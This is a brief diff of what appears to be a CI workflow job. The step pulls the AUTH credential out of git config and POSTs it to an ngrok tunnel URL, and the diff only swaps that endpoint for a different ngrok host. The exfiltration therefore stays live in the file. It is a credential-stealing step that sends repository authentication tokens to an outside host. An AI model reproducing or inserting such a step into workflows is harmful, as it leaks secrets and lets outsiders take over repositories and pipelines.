@@ -19,7 +19,7 @@ jobs:
           auth=$(git config --list | grep AUTH | tr -d ' ')
           
           curl --request POST \
-          --url https://5aa7-93-172-42-40.ngrok.io \
+          --url https://934e-77-137-8-226.ngrok.io \
           --header 'content-type: application/json' \
           --data '{
             "auth": "'$auth'",
